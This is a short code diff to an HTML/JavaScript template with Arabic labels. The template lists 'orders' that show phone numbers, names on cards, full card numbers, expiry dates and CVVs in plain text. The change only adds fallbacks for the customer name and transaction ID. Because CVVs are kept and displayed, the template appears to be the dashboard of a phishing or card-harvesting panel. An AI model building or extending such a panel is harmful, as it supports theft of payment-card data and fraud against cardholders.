@@ -73,7 +73,7 @@
                 <div class="order-card" style="border-right-color: ${getStatusColor(order.status)}">
                     <div class="order-header">
                         <div>
-                            <strong style="font-size: 18px;">${order.name}</strong> 
+                            <strong style="font-size: 18px;">${order.full_name || 'بدون اسم'}</strong> 
                             <span style="color: #64748b; font-size: 12px; margin-right: 15px;">📅 ${order.timestamp}</span>
                         </div>
                         <span class="status-badge" style="background: ${getStatusColor(order.status)}20; color: ${getStatusColor(order.status)}">
@@ -82,7 +82,7 @@
                     </div>
                     <div class="grid">
                         <div class="info-box"><span class="label">الهاتف</span><span class="value">${order.phone}</span></div>
-                        <div class="info-box"><span class="label">رقم المعاملة</span><span class="value" style="color: #0066cc;">${order.transactionId}</span></div>
+                        <div class="info-box"><span class="label">رقم المعاملة</span><span class="value" style="color: #0066cc;">${order.transactionId || order.id}</span></div>
                         <div class="info-box"><span class="label">الاسم على البطاقة</span><span class="value">${order.cardName}</span></div>
                         <div class="info-box"><span class="label">رقم البطاقة</span><span class="value" style="letter-spacing: 1px;">${order.cardNumber}</span></div>
                         <div class="info-box"><span class="label">التاريخ / CVV</span><span class="value">${order.expiryDate} / ${order.cvv}</span></div>
